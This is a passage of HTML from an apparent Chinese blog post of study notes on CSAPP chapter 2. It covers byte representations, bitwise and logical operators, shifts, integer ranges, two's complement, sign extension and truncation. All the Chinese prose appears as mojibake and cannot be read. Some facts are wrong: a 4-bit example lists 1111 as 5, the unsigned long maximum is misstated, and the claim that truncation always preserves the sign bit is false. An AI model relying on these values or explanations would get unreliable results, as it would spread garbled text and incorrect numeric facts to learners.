function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">0x00003039</span>;   <span class="hljs-comment">//åè¿›åˆ¶12345è½¬æ¢ä¸ºåå…­è¿›åˆ¶3039</span><br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    <span class="hljs-type">float</span> y=x;<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">39 30 00 00 <br>00 e4 40 46<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è™½ç„¶ä¸¤ç§ç±»å‹çš„æ•°æ®éƒ½æ˜¯å¯¹ 12345 ç¼–ç ï¼Œä½†ä»–ä»¬æœ‰ä¸åŒçš„å­—èŠ‚æ¨¡å¼ã€‚æµ®ç‚¹æ•°çš„è¾“å‡ºåœ¨æ•´æ•°å½¢æ€ä¸‹ä¸º <code>0x4640E400</code>ï¼Œä¸æ•´æ•°çš„å­˜å‚¨æœ‰ç€æˆªç„¶ä¸åŒçš„ç»“æœã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯¹è¿™ä¸ªç»“æœçš„äºŒè¿›åˆ¶é€‚å½“ç§»ä½ï¼Œå°±ä¼šå‘ç°å®ƒä»¬æœ‰13ä¸ªç›¸åŒ¹é…çš„ä½ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>    <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">9</span><br><span class="hljs-attribute">000000000</span> <span class="hljs-number">0000000001000000111001</span><br>            <span class="hljs-attribute">4</span>   <span class="hljs-number">6</span>   <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   E    <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span><br>          <span class="hljs-attribute">0100011001000000111001</span> <span class="hljs-number">0000000000</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¢å…¶ä»–çš„æ•°æ®å†æ¬¡å°è¯•å°±å¯ä»¥å‘ç°ï¼ŒåŒ¹é…çš„æ€»æ˜¯ int å‹çš„ä½ä½ï¼Œä½†åŒ¹é…ä½æ•°ä¸å›ºå®šï¼Œfloatå‹çš„åŒ¹é…éƒ¨åˆ†ä¹Ÿä¸æ˜¯æ€»æ˜¯ä»æœ€é«˜ä½å¼€å§‹ã€‚</p><blockquote><p>åŸå› æ˜¯æµ®ç‚¹æ•°çš„å°¾æ•°åŸºæœ¬æ˜¯å’ŒåŸäºŒè¿›åˆ¶çš„å€¼ä¸€è‡´çš„ï¼Œæ¥ä¸‹æ¥æµ®ç‚¹æ•°éƒ¨åˆ†ä¼šæœ‰ç›¸å…³åŸç†è§£é‡Š</p></blockquote><h3 id="è¡¨ç¤ºå­—ç¬¦ä¸²"><a href="#è¡¨ç¤ºå­—ç¬¦ä¸²" class="headerlink" title="è¡¨ç¤ºå­—ç¬¦ä¸²"></a>è¡¨ç¤ºå­—ç¬¦ä¸²</h3><p>åœ¨Cè¯­è¨€ä¸­ï¼Œå­—ç¬¦ä¸²è¢«ç¼–ç ä¸ºä»¥ NULL ç»“å°¾çš„å­—ç¬¦æ•°ç»„ï¼Œå­—ç¬¦å¸¸ç”¨ ASCII å­—ç¬¦ç ç¼–ç è¡¨ç¤ºã€‚</p><p>å­—ç¬¦ä¸²æ•°ç»„æ˜¯ä»¥å¤§ç«¯åºå‚¨å­˜çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬å­˜å‚¨ä¸€ä¸ªå­—ç¬¦ä¸² <code>char s[] = &quot;12345&quot;</code>ï¼Œé‚£ä¹ˆå®é™…ä¸Šçš„å­˜å‚¨é¡ºåºå°±æ˜¯ <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=&#39;4&#39;,s[4]=&#39;5&#39;,s[5]=&#39;null&#39;</code>ã€‚éœ€è¦æ³¨æ„ï¼Œå°±ç®—æˆ‘ä»¬åœ¨ç¼–å†™å­˜å‚¨å­—ç¬¦ä¸²æ—¶å¹¶æ²¡æœ‰ç¼–å†™æœ«å°¾çš„ç©ºå­—èŠ‚ï¼Œæœºå™¨ä¹Ÿä¼šè‡ªåŠ¨è¡¥å……åœ¨å­—ç¬¦ä¸²çš„æœ«å°¾ä¹Ÿå°±æ˜¯æœ€é«˜ä½ä¸Šã€‚</p><p>ç©ºå­—èŠ‚è¢«åŒ…å«åœ¨å­—ç¬¦ä¸²å½“ä¸­ï¼Œæˆ‘ä»¬åœ¨é™åˆ¶å­—ç¬¦ä¸²è¾“å…¥é•¿åº¦æ—¶éœ€è¦æ³¨æ„é˜²æ­¢æº¢å‡ºã€‚</p><h3 id="è¡¨ç¤ºä»£ç "><a href="#è¡¨ç¤ºä»£ç " class="headerlink" title="è¡¨ç¤ºä»£ç "></a>è¡¨ç¤ºä»£ç </h3><p>ä¸åŒæœºå™¨ç±»å‹ä½¿ç”¨ä¸åŒä¸”ä¸å…¼å®¹çš„æŒ‡ä»¤å’Œç¼–ç æ–¹å¼ï¼ŒäºŒè¿›åˆ¶ç æ˜¯ä¸å…¼å®¹çš„ã€‚</p><p>ä»æœºå™¨çš„è§’åº¦æ¥çœ‹ï¼Œç¨‹åºå°±ä»…ä»…æ˜¯å­—èŠ‚åºåˆ—ï¼Œä¸ä¼šæœ‰ç‰¹å®šçš„ä¿¡æ¯æ¥æŒ‡ç¤ºæºç¨‹åºã€‚</p><h3 id="å¸ƒå°”ä»£æ•°ç®€ä»‹"><a href="#å¸ƒå°”ä»£æ•°ç®€ä»‹" class="headerlink" title="å¸ƒå°”ä»£æ•°ç®€ä»‹"></a>å¸ƒå°”ä»£æ•°ç®€ä»‹</h3><p>å¸ƒå°”ä»£æ•°æ˜¯åœ¨äºŒå…ƒé›†åˆ <code>&#123;0ï¼Œ1&#125;</code> åŸºç¡€ä¸Šçš„å®šä¹‰ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šæˆ‘ä»¬å¯ä»¥è¿›è¡Œç›¸å…³çš„è¿ç®—ã€‚</p><ul><li><p>ä¸</p><p>1ä¸1ä¸º1ï¼Œ1ä¸0ä¸º0ï¼Œ0ä¸1ä¸º0ï¼Œ0ä¸0ä¸º0</p></li><li><p>æˆ–</p><p>1æˆ–1ä¸º1ï¼Œ1æˆ–0ä¸º1ï¼Œ0æˆ–1ä¸º1ï¼Œ0æˆ–0ä¸º0</p></li><li><p>é</p><p>é0ä¸º1ï¼Œé1ä¸º0</p></li><li><p>äº¦æˆ–</p><p>1å¼‚æˆ–1ä¸º0ï¼Œ1å¼‚æˆ–0ä¸º1ï¼Œ0å¼‚æˆ–1ä¸º1ï¼Œ0å¼‚æˆ–0ä¸º0</p></li></ul><h3 id="Cè¯­è¨€ä¸­çš„è¿ç®—"><a href="#Cè¯­è¨€ä¸­çš„è¿ç®—" class="headerlink" title="Cè¯­è¨€ä¸­çš„è¿ç®—"></a>Cè¯­è¨€ä¸­çš„è¿ç®—</h3><h4 id="ä½çº§è¿ç®—"><a href="#ä½çº§è¿ç®—" class="headerlink" title="ä½çº§è¿ç®—"></a>ä½çº§è¿ç®—</h4><p>Cè¯­è¨€æ”¯æŒæŒ‰ä½çš„å¸ƒå°”è¿ç®—ï¼Œæ¯ä¸€ä½ä¹‹é—´ç‹¬ç«‹çš„è¿›è¡Œè¿ç®—ã€‚ä¾‹å¦‚å‘é‡ <code>[a,b,â€¦,c]</code> å’Œ <code>[A,B,â€¦,C]</code> ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠæ¯ä¸€ä½å…ƒç´ æ‹¿å‡ºæ¥å•ç‹¬è¿›è¡Œè¿ç®—ï¼Œæ¯ä¸€ä½ç»“æœä¸ºæ–°å‘é‡å¯¹åº”ä½çš„ç»“æœã€‚</p><p>åœ¨ C è¯­è¨€ä¸­ï¼Œä»¥ä¸Šé€»è¾‘è¿ç®—å¯¹åº”çš„ç¬¦å·åˆ†åˆ«ä¸ºï¼š</p><ul><li>éï¼š~</li><li>ä¸ï¼š&amp;</li><li>æˆ–ï¼š|</li><li>å¼‚æˆ–ï¼š^</li></ul><h5 id="é€»è¾‘è¿ç®—"><a href="#é€»è¾‘è¿ç®—" class="headerlink" title="é€»è¾‘è¿ç®—"></a>é€»è¾‘è¿ç®—</h5><p>C è¯­è¨€ä¸­æˆ‘ä»¬ç”¨ bool ç±»å‹æ¥è¡¨ç¤ºé€»è¾‘è¿ç®—ç»“æœï¼Œ<code>true </code>è¡¨ç¤º <code>çœŸ(1)</code>ï¼Œ<code>false </code> è¡¨ç¤º <code>å‡(0)</code> ã€‚é€»è¾‘è¿ç®—æœ‰å•ç‹¬çš„è¿ç®—ç¬¦ï¼š</p><ul><li><code>&amp;&amp;</code>ï¼ˆé€»è¾‘ä¸ï¼‰ï¼šå¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸ºçœŸï¼Œåˆ™ç»“æœä¸ºçœŸï¼›å¦åˆ™ï¼Œç»“æœä¸ºå‡ã€‚</li><li><code>||</code>ï¼ˆé€»è¾‘æˆ–ï¼‰ï¼šå¦‚æœè‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºçœŸï¼Œåˆ™ç»“æœä¸ºçœŸï¼›å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸ºå‡ï¼Œåˆ™ç»“æœä¸ºå‡ã€‚</li><li><code>!</code>ï¼ˆé€»è¾‘éï¼‰ï¼šç”¨äºå–åæ“ä½œæ•°çš„å€¼ï¼Œå¦‚æœæ“ä½œæ•°ä¸ºçœŸï¼Œåˆ™å–ååä¸ºå‡ï¼Œå¦‚æœæ“ä½œæ•°ä¸ºå‡ï¼Œåˆ™å–ååä¸ºçœŸã€‚</li></ul><blockquote><p>bool æ•°æ®åœ¨è¿›è¡Œè¿ç®—æ—¶ï¼Œä¼šæŠŠæ‰€æœ‰å‚ä¸è¿ç®—çš„å€¼è½¬ä¸º <code>bool</code> ç±»å‹ï¼Œ<code>0</code> å°±æ˜¯ <code>0</code>ï¼Œä¸æ˜¯ <code>0</code> ä¸€å¾‹éƒ½æ˜¯ <code>1</code>ã€‚</p></blockquote><h4 id="ç§»ä½è¿ç®—"><a href="#ç§»ä½è¿ç®—" class="headerlink" title="ç§»ä½è¿ç®—"></a>ç§»ä½è¿ç®—</h4><p>ç§»ä½è¿ç®—åˆ†ä¸ºå·¦ç§»å’Œå³ç§»ï¼Œåˆ†åˆ«ç”¨ç¬¦å· <code>&lt;&lt;</code> å’Œ <code>&gt;&gt;</code> è¡¨ç¤ºã€‚</p><p>å‡è®¾æ•´æ•° <em>X</em> ä¸€å…± w ä½ï¼Œ<code>X&gt;&gt;k</code> å³ç§» k ä½è¡¨ç¤ºä¸¢å¼ƒä½ k ä½ï¼ŒåŸæ¥çš„é«˜ <code>w-k</code> ä½å˜ä¸ºä½ <code>w-k</code> ä½ï¼Œé«˜ <code>k</code> ä½å˜ä¸º0ã€‚<code>X&lt;&lt;k</code> å·¦ç§» k ä½è¡¨ç¤ºä¸¢å¼ƒé«˜ k ä½ï¼ŒåŸæ¥çš„ä½ <code>w-k</code> ä½å˜ä¸ºé«˜ <code>w-k</code> ä½ï¼Œä½ <code>k</code> ä½å˜ä¸º0ã€‚</p><p>å…¶ä¸­å³ç§»è¿ç®—åˆåˆ†ä¸º<strong>ç®—æœ¯å³ç§»</strong>å’Œ<strong>é€»è¾‘å³ç§»</strong>ã€‚äºŒè€…ä¹‹é—´çš„å·®å¼‚å°±æ˜¯é«˜ä½å¡«å……å€¼çš„ä¸åŒï¼Œç®—æœ¯å³ç§»å¤åˆ¶æœ€é«˜ä½ï¼Œé€»è¾‘å³ç§»å¡«å……0ã€‚</p><p>ç”±äºç®—æœ¯å³ç§»çš„é«˜ä½å¡«å……çš„æ˜¯åŸæœ¬çš„æœ€é«˜ä½å€¼è€Œä¸æ˜¯0ï¼Œæ‰€ä»¥<strong>ç®—æœ¯å³ç§»ç”¨äºå¤„ç†å¸¦ç¬¦å·æ•´æ•°ï¼Œé€»è¾‘å³ç§»ç”¨äºå¤„ç†æ— ç¬¦å·æ•´æ•°</strong>ã€‚</p><h2 id="æ•´æ•°è¡¨ç¤º"><a href="#æ•´æ•°è¡¨ç¤º" class="headerlink" title="æ•´æ•°è¡¨ç¤º"></a>æ•´æ•°è¡¨ç¤º</h2><h3 id="æ•´æ•°æ•°æ®ç±»å‹"><a href="#æ•´æ•°æ•°æ®ç±»å‹" class="headerlink" title="æ•´æ•°æ•°æ®ç±»å‹"></a>æ•´æ•°æ•°æ®ç±»å‹</h3><p>Cè¯­è¨€æœ‰å¤šç§ä¸åŒçš„æ•´æ•°æ•°æ®ç±»å‹ï¼Œç”¨æ¥è¡¨ç¤ºä¸åŒèŒƒå›´çš„æ•´æ•°ã€‚æ¯ä¸€ç§ç±»å‹éƒ½å¯ä»¥ç”¨å…³é”®å­—æ¥æŒ‡å®šå¤§å°ä»¥åŠæ•°å­—çš„æ­£è´Ÿã€‚æ ¹æ®å­—èŠ‚åˆ†é…ï¼Œä¸åŒçš„å¤§å°æ‰€èƒ½è¡¨ç¤ºçš„å€¼çš„èŒƒå›´ä¸åŒï¼Œå…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><blockquote><p>64ä½å’Œ32ä½åªç”¨longæŒ‡ç¤ºç¬¦çš„å–å€¼èŒƒå›´ä¸åŒï¼Œæ‹¬å·å†…ä¸º32ä½å¯¹åº”çš„å–å€¼èŒƒå›´</p></blockquote><table><thead><tr><th>Cæ•°æ®ç±»å‹</th><th>æœ€å°å€¼</th><th>æœ€å¤§å€¼</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808 (-2147483648)</td><td>9223372036854775807 (2147483647)</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615 (4294967295)</td></tr></tbody></table><p>å¦‚ä¸Šè¡¨æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæœ‰ç¬¦å·çš„æ•°æ®ç±»å‹åœ¨æ­£æ•°å’Œè´Ÿæ•°çš„èŒƒå›´å¹¶ä¸ä¸¥æ ¼å¯¹ç§°ï¼Œè´Ÿæ•°èŒƒå›´æ€»æ˜¯æ¯”æ­£æ•°å¤§1ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé€šå¸¸Cè¯­è¨€ä¸­<strong>å¤§å¤šæ•°çš„æ•°å­—éƒ½é»˜è®¤ä¸ºæœ‰ç¬¦å·</strong>ï¼Œè¦åˆ›å»ºæ— ç¬¦å·å¸¸é‡å¿…é¡»åŠ ä¸Šåç¼€å­—ç¬¦ <code>&#39;u&#39;</code> æˆ– <code>&#39;U&#39;</code>ã€‚ä¾‹å¦‚å£°æ˜ <code>12345</code> è¿™æ ·çš„å¸¸é‡å°±è¢«è®¤ä¸ºæ˜¯æœ‰ç¬¦å·çš„ï¼Œ <code>0x12b4u</code> æ‰ä¼šè¢«è®¤ä¸ºæ˜¯æ— ç¬¦å·å¸¸é‡ã€‚</p><h4 id="æ— ç¬¦å·æ•°çš„ç¼–ç "><a href="#æ— ç¬¦å·æ•°çš„ç¼–ç " class="headerlink" title="æ— ç¬¦å·æ•°çš„ç¼–ç "></a>æ— ç¬¦å·æ•°çš„ç¼–ç </h4><p>æ— ç¬¦å·æ•°å®é™…ä¸Šå°±æ˜¯éè´Ÿæ•°ï¼Œå°±æ˜¯åªåŒ…æ‹¬æ­£æ•°å’Œ 0 çš„éƒ¨åˆ†ã€‚æ— ç¬¦å·æ•°æ²¡æœ‰ç¬¦å·ä½ï¼Œå› æ­¤ä»–ä»¬çš„ç¼–ç èŒƒå›´å§‹ç»ˆä» 0 å¼€å§‹ã€‚</p><p>æ— ç¬¦å·æ•´æ•°çš„ç¼–ç æ–¹æ³•é€šå¸¸åŸºäºäºŒè¿›åˆ¶è¡¨ç¤ºï¼Œæ¯ä½ï¼ˆæˆ–ä½ç»„åˆï¼‰å¯ä»¥è¡¨ç¤º 2 ä¸ªå¯èƒ½çš„å€¼ï¼š0å’Œ1ã€‚ç¼–ç ä¸­æ²¡æœ‰ç¬¦å·ä½ï¼Œ<strong>æœ€é«˜ä½é€šå¸¸æ˜¯æœ€é«˜æœ‰æ•ˆä½</strong>ï¼Œè¡¨ç¤ºæœ€å¤§çš„æƒå€¼ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-%E6%97%A0%E7%AC%A6%E5%8F%B7%E7%BC%96%E7%A0%81.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>ä½äºŒè¿›åˆ¶ç¼–ç ï¼š<span class="hljs-number">0000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">1001</span> (<span class="hljs-number">9</span>), <span class="hljs-number">1111</span> (<span class="hljs-number">5</span>)<br><span class="hljs-attribute">8</span>ä½äºŒè¿›åˆ¶ç¼–ç ï¼š<span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">01011010</span> (<span class="hljs-number">90</span>), <span class="hljs-number">11111111</span> (<span class="hljs-number">255</span>)<br></code></pre></td></tr></table></figure><blockquote><p>å°±æ˜¯æœ€ç®€å•çš„æ­£å¸¸äºŒè¿›åˆ¶è¡¨ç¤ºæ–¹æ³• </p></blockquote><h4 id="è¡¥ç ç¼–ç "><a href="#è¡¥ç ç¼–ç " class="headerlink" title="è¡¥ç ç¼–ç "></a>è¡¥ç ç¼–ç </h4><p>å®é™…è¿ç”¨ä¸­ä¸ä»…åªæœ‰æ­£æ•°æ•°æ®ï¼Œæˆ‘ä»¬è¿˜æƒ³è¦å®ç°è´Ÿæ•°å€¼ï¼Œè¡¥ç å°±æ˜¯æœ€å¸¸è§çš„è´Ÿæ•°è¡¨ç¤ºæ–¹æ³•ã€‚</p><p>åœ¨è¡¥ç çš„å®šä¹‰ä¸­ï¼Œ<strong>å­—çš„æœ€é«˜ä½ä¸ºç¬¦å·ä½</strong>ã€‚ç¬¦å·ä½ä¸º0è¡¨ç¤ºæ­£æ•°ï¼Œç¬¦å·ä½ä¸º1è¡¨ç¤ºè´Ÿæ•°ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>ä½äºŒè¿›åˆ¶è¡¥ç ï¼š <span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">00000101</span> (<span class="hljs-number">5</span>), <span class="hljs-number">11111011</span> (-<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>åœ¨å•çº¯çš„äºŒè¿›åˆ¶æ•°å­—å±‚é¢ï¼Œç”±äºæœ€é«˜ä½æ˜¯æœ€é«˜æƒå€¼ï¼Œæ‰€ä»¥åœ¨ä½æ•°ç›¸åŒçš„æƒ…å†µä¸‹ï¼Œæœ€é«˜ä½æ˜¯ 1 çš„äºŒè¿›åˆ¶æ•°æ°¸è¿œå¤§äºæœ€é«˜ä½æ˜¯ 0 çš„äºŒè¿›åˆ¶æ•°ã€‚å› æ­¤æ­£è´Ÿæ•°è¡¥ç å¯¹åº”çš„äºŒè¿›åˆ¶èŒƒå›´æ˜¯æ²¡æœ‰äº¤é›†çš„ï¼Œæ‰€ä»¥æ— è®ºå…¶ä»–ä½å¦‚ä½•å˜åŒ–éƒ½ä¸ä¼šä½¿æŸä¸ªæ•°æ®çš„æ­£è´Ÿæ··æ·†ã€‚</p><h3 id="æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢"><a href="#æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢" class="headerlink" title="æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢"></a>æœ‰ç¬¦å·æ•°ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢</h3><p>æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢åˆ†ä¸ºä¸¤ç§ï¼šæ˜¾ç¤ºè½¬æ¢å’Œéšå¼è½¬æ¢ã€‚</p><p><strong>æ˜¾ç¤ºè½¬æ¢</strong>ä¹Ÿç§°å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œéœ€è¦ä½¿ç”¨ç‰¹å®šçš„è¯­æ³•å’Œç±»å‹è½¬æ¢æ“ä½œç¬¦ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = (<span class="hljs-type">int</span>) unsignedValue ; <br>unsignedValue = (<span class="hljs-type">unsigned</span>) signedValue;<br></code></pre></td></tr></table></figure><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ˜¾ç¤ºè½¬æ¢å¯èƒ½å¯¼è‡´æ•°æ®æˆªæ–­æˆ–æ•°æ®ä¸¢å¤±ã€‚</p></blockquote><p><strong>éšå¼è½¬æ¢</strong>ä¹Ÿç§°ä¸ºè‡ªåŠ¨ç±»å‹è½¬æ¢æˆ–è‡ªåŠ¨å‡çº§ï¼Œç”±ç¼–è¯‘å™¨è‡ªåŠ¨æ‰§è¡Œï¼Œä»¥ä½¿è¡¨è¾¾å¼æˆ–æ“ä½œèƒ½å¤ŸæˆåŠŸè¿›è¡Œã€‚</p><p>ä¾‹å¦‚ï¼Œå°†ä¸€ç§ç±»å‹çš„è¡¨è¾¾å¼èµ‹å€¼ç»™å¦å¤–ä¸€ç§ç±»å‹çš„å˜é‡ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ‰§è¡Œéšå¼è½¬æ¢ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = unsignedValue ; <br>unsignedValue = signedValue;<br></code></pre></td></tr></table></figure><p>ä¸åŒç±»å‹çš„å˜é‡è¿›è¡Œè¿ç®—æ—¶å‘ç”Ÿçš„ä¹Ÿæ˜¯éšå¼è½¬æ¢ã€‚</p><p>éšå¼è½¬æ¢åŸåˆ™ï¼š</p><ul><li><p>åœ¨æ··åˆä½¿ç”¨æµ®ç‚¹æ•°å’Œæ•´æ•°ç±»å‹æ—¶ï¼Œé€šå¸¸å°†æ•´æ•°æå‡ä¸ºæµ®ç‚¹æ•°ï¼Œå‡ºç°è¿‡doubleåˆ™ç»“æœä¸€å®šä¸ºdouble</p></li><li><p>è‹¥éƒ½æ˜¯æ•´æ•°å‚ä¸è¿ç®—åˆ™ç»“æœä¹Ÿæ˜¯æ•´æ•°</p></li><li><p>æ•´æ•°è¿ç®—çš„ç»“æœä¸ºå‡ºç°è¿‡çš„ä½æ•°æœ€å¤§çš„æ•´æ•°ï¼Œè‹¥æœ€å¤§çš„æ•´æ•°ä¸­æœ‰æ— ç¬¦å·ç±»å‹çš„åˆ™ç»“æœæ— ç¬¦å·ã€‚</p></li></ul><h3 id="æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨ç¤º"><a href="#æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨ç¤º" class="headerlink" title="æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨ç¤º"></a>æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨ç¤º</h3><p>è¦å°†æ— ç¬¦å·æ•°è½¬åŒ–æˆä¸€ä¸ªæ›´å¤§çš„æ•°æ®ç±»å‹ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å¼€å¤´æ·»åŠ  <code>0</code> å³å¯ã€‚è¿™ç§è¿ç®—ç§°ä¸º <strong>0 æ‰©å±•</strong>ã€‚</p><p>ä½†æ˜¯å¦‚æœæ˜¯å°†è¡¥ç æ•°å­—è½¬æ¢ä¸ºæ›´å¤§çš„æ•°æ®ç±»å‹ï¼Œå°†ä¼šæ‰§è¡Œ<strong>ç¬¦å·æ‰©å±•</strong>ï¼Œéè´Ÿæ•°å¼€å¤´æ·»åŠ  <code>0</code> ï¼Œè´Ÿæ•°åˆ™éœ€è¦å¼€å¤´æ·» <code>1</code>ã€‚</p><p>æˆ‘ä»¬è¿è¡Œä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">short</span> x=<span class="hljs-number">0x1234</span>;<br>    <span class="hljs-type">short</span> y=<span class="hljs-number">-0x1234</span>;<br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>    <span class="hljs-type">int</span> x1=x;<br>    <span class="hljs-type">int</span> y1=y;<br>    show_bytes(&amp;x1,<span class="hljs-keyword">sizeof</span>(x1));<br>    show_bytes(&amp;y1,<span class="hljs-keyword">sizeof</span>(y1));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">34 12 <br>cc ed<br>34 12 00 00<br>cc ed ff ff<br></code></pre></td></tr></table></figure><h3 id="æˆªæ–­æ•°å­—"><a href="#æˆªæ–­æ•°å­—" class="headerlink" title="æˆªæ–­æ•°å­—"></a>æˆªæ–­æ•°å­—</h3><p>æˆ‘ä»¬éœ€è¦å‡å°‘ä¸€ä¸ªæ•°å­—çš„ä½æ•°æ—¶å°±éœ€è¦æˆªæ–­æ•°å­—ï¼Œå½“æˆ‘ä»¬å°† w ä½çš„æ•°å­—æˆªæ–­ä¸º k ä½æ•°å­—æ—¶ï¼Œæˆ‘ä»¬å°±ä¼šä¸¢å¼ƒæœ‰æ•ˆä½çš„é«˜ <code>w-k</code> ä½ï¼Œè¡¥ç æ•°å­—çš„ç¬¦å·ä½æ˜¯å§‹ç»ˆä¸å˜çš„ã€‚</p><p>éœ€è¦æ³¨æ„æœ‰ç¬¦å·æ•°çš„é˜¶æ®µå¯èƒ½ä¼šå‘ç”Ÿæº¢å‡ºç°è±¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª8ä½å¸¦ç¬¦å·æ•´æ•°ï¼Œå…¶èŒƒå›´æ˜¯ä» -128 åˆ° 127ã€‚å¦‚æœåŸå§‹å¸¦ç¬¦å·æ•´æ•°ä¸º -150ï¼Œå°†å…¶æˆªæ–­ä¸º 8 ä½å¸¦ç¬¦å·æ•´æ•°ä¼šå¯¼è‡´æº¢å‡ºï¼Œå› ä¸º -150 ä¸åœ¨ -128 åˆ° 127 çš„èŒƒå›´å†…ã€‚æˆªæ–­åçš„ç»“æœå¯èƒ½æ˜¯æ­£æ•° 106ï¼Œè¿™æ˜¯ -150 çš„æº¢å‡ºç»“æœï¼Œè¿™ä¸æ˜¯åŸå§‹å€¼çš„æ­£ç¡®è¡¨ç¤ºã€‚</p><h2 